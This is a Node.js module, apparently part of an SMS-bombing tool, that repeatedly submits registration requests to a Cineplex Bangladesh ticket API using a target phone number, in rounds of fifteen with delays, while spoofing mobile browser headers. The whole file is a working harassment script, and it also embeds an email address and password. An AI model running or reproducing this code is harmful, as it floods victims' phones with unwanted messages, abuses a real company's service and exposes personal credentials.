const axios = require("axios");
const FormData = require("form-data");

async function cineplex(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 15; i++) {
      try {
        const form = new FormData();
form.append('name', "It'z HA S AN");
form.append('msisdn', number);
form.append('email', 's.k.hasan32425@gmail.com');
form.append('gender', '1');
form.append('password', 'Hasan5&7');
form.append('confirm_password', 'Hasan5&7');
form.append('r_token', 'asdfadfasdfasdfa');

const response = await axios.post(
  'https://cineplex-ticket-api.cineplexbd.com/api/v1/register',
  form,
  {
    headers: {
      ...form.getHeaders(),
      'authority': 'cineplex-ticket-api.cineplexbd.com',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-US,en;q=0.9',
      'application': 'application/json',
      'appsource': 'web',
      'authorization': 'Bearer null',
      'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryBF3Fr6o9Arin0FFf',
      'device-key': '65db5fb6534926c910067182d4c9c2d7f87f93c50ee57bd7bd762bd5caecf2d3',
      'origin': 'https://ticket.cineplexbd.com',
      'referer': 'https://ticket.cineplexbd.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 180000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { cineplex };
